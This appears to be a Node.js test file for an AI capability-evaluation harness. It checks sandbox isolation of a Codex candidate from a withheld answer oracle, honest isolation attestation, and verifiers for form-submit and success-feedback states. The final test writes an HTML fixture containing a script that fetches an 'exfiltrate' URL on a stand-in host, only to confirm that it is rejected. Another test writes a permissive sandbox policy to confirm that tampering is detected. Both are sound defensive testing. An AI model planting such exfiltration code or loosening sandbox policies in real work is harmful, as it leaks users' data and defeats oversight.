"use strict";

const test = require("node:test");
const assert = require("node:assert/strict");
const { execFileSync } = require("node:child_process");
const crypto = require("node:crypto");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const vm = require("node:vm");

const { _private, runCapabilityBatch } = require("../scripts/evals/design-critique-capability-run");
const { validateOracleIsolationEvidence } = require("../scripts/evals/design-critique-capability");
const {
  CHECKS,
  assertSafePostSubject,
  validateVerifierCoverage,
  verifyPostSubject,
} = require("../evals/capabilities/design-critique/verify");

const ROOT = path.resolve(__dirname, "..");

async function evaluateStateVerifier(checkId, transitions) {
  let elapsed = 0;
  let clicked = false;
  let nextTransition = 0;
  const notice = { textContent: "" };
  const email = { value: "" };
  const submit = {
    disabled: false,
    ariaDisabled: null,
    getAttribute(name) {
      return name === "aria-disabled" ? this.ariaDisabled : null;
    },
    click() {
      clicked = true;
      applyTransitions();
    },
  };

  function applyTransitions() {
    if (!clicked) return;
    while (nextTransition < transitions.length && transitions[nextTransition].at <= elapsed) {
      const transition = transitions[nextTransition];
      if (Object.prototype.hasOwnProperty.call(transition, "notice")) {
        notice.textContent = transition.notice;
      }
      if (Object.prototype.hasOwnProperty.call(transition, "disabled")) {
        submit.disabled = transition.disabled;
      }
      if (Object.prototype.hasOwnProperty.call(transition, "ariaDisabled")) {
        submit.ariaDisabled = transition.ariaDisabled;
      }
      nextTransition += 1;
    }
  }

  return vm.runInNewContext(CHECKS[checkId].expression, {
    Date: { now: () => elapsed },
    document: {
      querySelector(selector) {
        if (selector === "#team-email") return email;
        if (selector === "button[type=submit]") return submit;
        if (selector === "#notice") return notice;
        return null;
      },
    },
    setTimeout(resolve, delay) {
      elapsed += delay;
      applyTransitions();
      resolve();
    },
  });
}

test("dedicated capability runner binds candidate findings and honest isolation evidence", () => {
  const outDir = fs.mkdtempSync(path.join(os.tmpdir(), "pm-capability-batch-"));
  const outPath = path.join(outDir, "repeat-1.json");
  const oracle = JSON.parse(
    fs.readFileSync(
      path.join(ROOT, "evals", "capabilities", "design-critique", "oracle.json"),
      "utf8"
    )
  );

  const result = runCapabilityBatch({
    rootDir: ROOT,
    profileId: "sol-high",
    repeat: 1,
    outPath,
    adapterOverride: "stub",
  });

  assert.equal(result.exitCode, 0, JSON.stringify(result.bundle.failures, null, 2));
  assert.equal(result.bundle.harness_only, true);
  assert.deepEqual(
    result.bundle.cases.map((item) => item.case_id).sort(),
    oracle.cases.map((item) => item.id).sort()
  );
  for (const item of result.bundle.cases) {
    const expected = oracle.cases.find((candidate) => candidate.id === item.case_id);
    assert.equal(item.fixture.sha256, expected.fixture_sha256);
    assert.equal(item.run.status, "pass");
    assert.match(item.source_identity.path, /source_identity\.json$/);
    assert.match(item.normalized_transcript.path, /transcript\.normalized\.jsonl$/);
    assert.match(item.candidate_output.path, /quality-output\.md$/);
    assert.match(item.candidate_findings.path, /capability-findings\.json$/);
    assert.match(item.oracle_isolation.path, /oracle_isolation\.json$/);
    assert.match(item.post_subject.path, /workdir\/ui\/design-critique\/capability-case\.html$/);

    const isolation = JSON.parse(
      fs.readFileSync(path.join(ROOT, item.oracle_isolation.path), "utf8")
    );
    assert.equal(isolation.os_enforced, false);
    assert.equal(isolation.mode, "stub-harness");
    const ledger = JSON.parse(
      fs.readFileSync(path.join(ROOT, item.candidate_findings.path), "utf8")
    );
    assert.equal(ledger.schema_version, 1);
    assert.equal(Array.isArray(ledger.findings), true);

    const scenarioDir = path.join(
      ROOT,
      "eval-results",
      "capability-scenarios",
      item.run.scenario_id
    );
    const candidateScenario = ["story.md", "setup.sh", "checks.sh"]
      .map((name) => fs.readFileSync(path.join(scenarioDir, name), "utf8"))
      .join("\n");
    for (const oracleCase of oracle.cases) {
      assert.equal(candidateScenario.includes(oracleCase.id), false);
      for (const defect of oracleCase.defects) {
        assert.equal(candidateScenario.includes(defect.id), false);
        assert.equal(candidateScenario.includes(defect.fix_oracle), false);
      }
    }
  }

  for (const item of [...result.bundle.cases, ...result.bundle.failures]) {
    if (item.run?.run_id) {
      fs.rmSync(path.join(ROOT, "eval-results", "runs", item.run.run_id), {
        recursive: true,
        force: true,
      });
    }
    if (item.run?.scenario_id) {
      fs.rmSync(path.join(ROOT, "eval-results", "capability-scenarios", item.run.scenario_id), {
        recursive: true,
        force: true,
      });
    }
  }
  fs.rmSync(outDir, { recursive: true, force: true });
});

test("capability-only Codex wrapper attests exact source denial and run allowance", () => {
  const boundary = fs.mkdtempSync(path.join(os.tmpdir(), "pm-capability-boundary-"));
  const rootDir = path.join(boundary, ".worktrees", "branch");
  fs.mkdirSync(rootDir, { recursive: true });
  const runIdentity = {
    run_id: "20260905T000000Z--dc-cap-example-sol-high-r1--codex",
    scenario_id: "dc-cap-example-sol-high-r1",
    adapter: "codex",
  };
  let observed;
  const prepared = _private.prepareCandidateIsolation({
    rootDir,
    runIdentity,
    runtimeProfile: { adapter: "codex", harness_only: false },
    sourceBoundary: boundary,
    sandboxExecPath: "/usr/bin/sandbox-exec",
    codexBin: process.execPath,
    sandboxRunner(command, argv) {
      observed = { command, argv };
      return { status: 0, signal: null, error: null };
    },
  });
  try {
    assert.equal(observed.command, "/usr/bin/sandbox-exec");
    assert.match(fs.readFileSync(prepared.profilePath, "utf8"), /deny file-read\*/);
    assert.match(fs.readFileSync(prepared.profilePath, "utf8"), /allow file-read\*/);
    assert.equal(prepared.evidence.mode, "sandbox-exec");
    assert.equal(prepared.evidence.os_enforced, true);
    assert.equal(prepared.evidence.source_read_denied, true);
    assert.equal(prepared.evidence.run_read_allowed, true);
    assert.match(prepared.evidence.bindings.policy.sha256, /^sha256:[a-f0-9]{64}$/);
    assert.match(prepared.evidence.bindings.launcher.sha256, /^sha256:[a-f0-9]{64}$/);
    assert.equal(fs.statSync(prepared.launchBin).mode & 0o777, 0o700);

    fs.mkdirSync(path.join(rootDir, "eval-results", "runs", runIdentity.run_id, "metadata"), {
      recursive: true,
    });
    fs.writeFileSync(prepared.receiptPath, prepared.receiptBytes);
    fs.writeFileSync(
      path.join(
        rootDir,
        "eval-results",
        "runs",
        runIdentity.run_id,
        "metadata",
        "codex_command.json"
      ),
      `${JSON.stringify({ command: prepared.launchBin })}\n`
    );
    const finalized = _private.finalizeCandidateIsolation({
      rootDir,
      runIdentity,
      prepared,
    });
    assert.match(finalized.bindings.launch_receipt.sha256, /^sha256:[a-f0-9]{64}$/);
    assert.match(finalized.bindings.command.sha256, /^sha256:[a-f0-9]{64}$/);
  } finally {
    prepared.cleanup();
    fs.rmSync(boundary, { recursive: true, force: true });
  }
});

test("capability-only Codex wrapper falls back to unattested when sandbox preflight fails", () => {
  const boundary = fs.mkdtempSync(path.join(os.tmpdir(), "pm-capability-boundary-"));
  const rootDir = path.join(boundary, ".worktrees", "branch");
  fs.mkdirSync(rootDir, { recursive: true });
  const prepared = _private.prepareCandidateIsolation({
    rootDir,
    runIdentity: {
      run_id: "20260905T000000Z--dc-cap-example-sol-high-r1--codex",
      scenario_id: "dc-cap-example-sol-high-r1",
      adapter: "codex",
    },
    runtimeProfile: { adapter: "codex", harness_only: false },
    sourceBoundary: boundary,
    sandboxExecPath: "/usr/bin/sandbox-exec",
    codexBin: process.execPath,
    sandboxRunner() {
      return { status: 71, signal: null, error: null };
    },
  });
  try {
    assert.equal(prepared.launchBin, null);
    assert.equal(prepared.evidence.mode, "unattested");
    assert.equal(prepared.evidence.os_enforced, false);
    assert.match(prepared.evidence.reason, /preflight failed/);
  } finally {
    prepared.cleanup();
    fs.rmSync(boundary, { recursive: true, force: true });
  }
});

test(
  "Darwin sandbox-exec really denies source reads and allows exact-run reads",
  { skip: process.platform !== "darwin" },
  (t) => {
    if (!fs.existsSync("/usr/bin/sandbox-exec")) {
      t.skip("sandbox-exec is unavailable");
      return;
    }
    const rootDir = fs.mkdtempSync(path.join(os.tmpdir(), "pm-capability-real-sandbox-"));
    const prepared = _private.prepareCandidateIsolation({
      rootDir,
      runIdentity: {
        run_id: "20260905T000000Z--dc-cap-real-sandbox-sol-high-r1--codex",
        scenario_id: "dc-cap-real-sandbox-sol-high-r1",
        adapter: "codex",
      },
      runtimeProfile: { adapter: "codex", harness_only: false },
      sourceBoundary: rootDir,
      codexBin: process.execPath,
    });
    try {
      if (!prepared.launchBin) {
        t.skip(`sandbox-exec is unavailable in this host boundary: ${prepared.evidence.reason}`);
        return;
      }
      assert.equal(prepared.evidence.mode, "sandbox-exec");
      assert.equal(prepared.evidence.preflight.denied_source_read, "pass");
      assert.equal(prepared.evidence.preflight.allowed_run_read, "pass");
    } finally {
      prepared.cleanup();
      fs.rmSync(rootDir, { recursive: true, force: true });
    }
  }
);

test("sandbox attestation revalidates policy semantics instead of trusting file hashes", () => {
  const rootDir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "pm-capability-binding-")));
  execFileSync("git", ["init", "-q"], { cwd: rootDir });
  const token = crypto.randomBytes(5).toString("hex");
  const runIdentity = {
    run_id: `20260905T000000Z--dc-cap-binding-${token}-r1--codex`,
    scenario_id: `dc-cap-binding-${token}-r1`,
    adapter: "codex",
  };
  const prepared = _private.prepareCandidateIsolation({
    rootDir,
    runIdentity,
    runtimeProfile: { adapter: "codex", harness_only: false },
    sandboxExecPath: "/usr/bin/sandbox-exec",
    codexBin: process.execPath,
    sandboxRunner() {
      return { status: 0, signal: null, error: null };
    },
  });
  const runDir = path.join(rootDir, "eval-results", "runs", runIdentity.run_id);
  try {
    fs.mkdirSync(path.join(runDir, "metadata"), { recursive: true });
    fs.writeFileSync(prepared.receiptPath, prepared.receiptBytes);
    fs.writeFileSync(
      path.join(runDir, "metadata", "codex_command.json"),
      `${JSON.stringify({ command: prepared.launchBin })}\n`
    );
    const finalized = _private.finalizeCandidateIsolation({
      rootDir,
      runIdentity,
      prepared,
    });
    assert.deepEqual(
      validateOracleIsolationEvidence({
        isolation: finalized,
        rootDir,
        runId: runIdentity.run_id,
      }),
      []
    );

    const policyPath = path.join(rootDir, finalized.bindings.policy.path);
    fs.writeFileSync(policyPath, "(version 1)\n(allow default)\n");
    finalized.bindings.policy.sha256 = `sha256:${crypto
      .createHash("sha256")
      .update(fs.readFileSync(policyPath))
      .digest("hex")}`;
    assert.match(
      validateOracleIsolationEvidence({
        isolation: finalized,
        rootDir,
        runId: runIdentity.run_id,
      }).join("\n"),
      /policy must deny the Git boundary and allow only the exact run/
    );
  } finally {
    prepared.cleanup();
    fs.rmSync(rootDir, { recursive: true, force: true });
  }
});

test("host fix verifier covers every withheld oracle and accepts the inert fixtures", () => {
  const oracle = JSON.parse(
    fs.readFileSync(
      path.join(ROOT, "evals", "capabilities", "design-critique", "oracle.json"),
      "utf8"
    )
  );
  assert.deepEqual(validateVerifierCoverage(oracle), []);
  for (const item of oracle.cases) {
    assert.doesNotThrow(() => assertSafePostSubject(path.join(ROOT, item.fixture_ref)), item.id);
  }
});

test("repeat-submit verification requires bounded settlement and re-enables the control", async () => {
  assert.equal(
    await evaluateStateVerifier("loading-allows-repeat-submit", [
      { at: 0, notice: "Saving settings", disabled: true },
      { at: 150, notice: "Settings saved", disabled: false },
    ]),
    true
  );
  assert.equal(
    await evaluateStateVerifier("loading-allows-repeat-submit", [
      { at: 0, notice: "Saving settings", disabled: true },
      { at: 150, notice: "Settings saved", disabled: true },
    ]),
    false,
    "a permanently disabled submit control is not a completed fix"
  );
  assert.equal(
    await evaluateStateVerifier("loading-allows-repeat-submit", [
      { at: 0, notice: "Saving settings", ariaDisabled: "true" },
      { at: 150, notice: "Settings saved", ariaDisabled: null },
    ]),
    false,
    "aria-disabled alone does not prevent a native repeat activation"
  );
  assert.equal(
    await evaluateStateVerifier("loading-allows-repeat-submit", [
      { at: 0, notice: "Saving settings" },
      { at: 50, disabled: true },
      { at: 150, notice: "Settings saved", disabled: false },
    ]),
    false,
    "a delayed native disable leaves a synchronous repeat-activation window"
  );
  assert.equal(
    await evaluateStateVerifier("loading-allows-repeat-submit", [
      { at: 0, notice: "Saving settings", disabled: true },
      { at: 150, notice: "Unable to save settings", disabled: false },
    ]),
    false,
    "an enabled error state is not a successful settlement"
  );
  assert.equal(
    await evaluateStateVerifier("loading-allows-repeat-submit", [
      { at: 0, notice: "Saving settings", disabled: true },
      { at: 150, notice: "Changes not saved", disabled: false },
    ]),
    false,
    "negated saved text is not a successful settlement"
  );
  for (const message of [
    "Nothing was saved",
    "No settings were saved",
    "Settings were not successfully saved",
    "The setting wasn't saved",
    "Settings weren't saved",
    "The setting isn't saved",
    "Settings aren't saved",
    "The setting wasn’t saved",
    "Settings weren’t saved",
    "The setting isn’t saved",
    "Settings aren’t saved",
  ]) {
    assert.equal(
      await evaluateStateVerifier("loading-allows-repeat-submit", [
        { at: 0, notice: "Saving settings", disabled: true },
        { at: 150, notice: message, disabled: false },
      ]),
      false,
      `${message} is not a successful settlement`
    );
  }
});

test("success-feedback verification rejects pending and error states", async () => {
  assert.equal(
    await evaluateStateVerifier("success-feedback-ephemeral", [
      { at: 0, notice: "Saving settings", disabled: true },
      { at: 150, notice: "Settings saved", disabled: false },
    ]),
    true
  );
  assert.equal(
    await evaluateStateVerifier("success-feedback-ephemeral", [
      { at: 0, notice: "Saving settings", disabled: true },
    ]),
    false,
    "a persistent pending label is not success feedback"
  );
  assert.equal(
    await evaluateStateVerifier("success-feedback-ephemeral", [
      { at: 0, notice: "Saving settings", disabled: true },
      { at: 150, notice: "Unable to save settings", disabled: false },
    ]),
    false,
    "an error label is not success feedback"
  );
  assert.equal(
    await evaluateStateVerifier("success-feedback-ephemeral", [
      { at: 0, notice: "Saving settings", disabled: true },
      { at: 150, notice: "Update unsuccessful", disabled: false },
    ]),
    false,
    "unsuccessful text is not success feedback"
  );
  for (const message of [
    "Nothing was saved",
    "No settings were saved",
    "Settings were not successfully saved",
    "The setting wasn't saved",
    "Settings weren't saved",
    "The setting isn't saved",
    "Settings aren't saved",
    "The setting wasn’t saved",
    "Settings weren’t saved",
    "The setting isn’t saved",
    "Settings aren’t saved",
  ]) {
    assert.equal(
      await evaluateStateVerifier("success-feedback-ephemeral", [
        { at: 0, notice: "Saving settings", disabled: true },
        { at: 150, notice: message, disabled: false },
      ]),
      false,
      `${message} is not success feedback`
    );
  }
  assert.equal(
    await evaluateStateVerifier("success-feedback-ephemeral", [
      { at: 0, notice: "Saving settings", disabled: true },
      { at: 150, notice: "Settings saved", disabled: false },
      { at: 900, notice: "" },
      { at: 1_100, notice: "Settings saved" },
    ]),
    false,
    "success feedback must remain continuously visible rather than disappear and reappear"
  );
  assert.equal(
    await evaluateStateVerifier("success-feedback-ephemeral", [
      { at: 0, notice: "Saving settings", disabled: true },
      { at: 150, notice: "Settings saved", disabled: false },
      { at: 900, notice: "Update completed successfully" },
      { at: 2_100, notice: "Changes updated" },
    ]),
    true,
    "clearly successful copy may change during the persistence interval"
  );
});

test("fix verification probes a private inert snapshot with outbound networking disabled", () => {
  const oracle = JSON.parse(
    fs.readFileSync(
      path.join(ROOT, "evals", "capabilities", "design-critique", "oracle.json"),
      "utf8"
    )
  );
  const item = oracle.cases.find((candidate) => candidate.id === "responsive-report");
  const sourcePath = path.join(ROOT, item.fixture_ref);
  const observed = [];
  const results = verifyPostSubject({
    oracleCase: { ...item, defects: [item.defects[0]] },
    htmlPath: sourcePath,
    browserPath: process.execPath,
    probe(configuration) {
      observed.push({ ...configuration, snapshot: fs.readFileSync(configuration.htmlPath) });
      return { stdout: "true\n" };
    },
  });

  assert.equal(results[0].status, "pass");
  assert.equal(observed[0].networkIsolation, true);
  assert.notEqual(observed[0].htmlPath, sourcePath);
  assert.deepEqual(observed[0].snapshot, fs.readFileSync(sourcePath));
  assert.equal(fs.existsSync(observed[0].htmlPath), false, "private snapshot should be removed");

  const unsafeDir = fs.mkdtempSync(path.join(os.tmpdir(), "pm-capability-unsafe-"));
  try {
    const unsafePath = path.join(unsafeDir, "subject.html");
    fs.writeFileSync(
      unsafePath,
      '<!doctype html><script>fetch("https://example.invalid/exfiltrate")</script>'
    );
    assert.throws(() => assertSafePostSubject(unsafePath), /forbidden/);
    let called = false;
    const unsafe = verifyPostSubject({
      oracleCase: { ...item, defects: [item.defects[0]] },
      htmlPath: unsafePath,
      browserPath: process.execPath,
      probe() {
        called = true;
        return { stdout: "true\n" };
      },
    });
    assert.equal(called, false);
    assert.equal(unsafe[0].status, "indeterminate");
  } finally {
    fs.rmSync(unsafeDir, { recursive: true, force: true });
  }
});
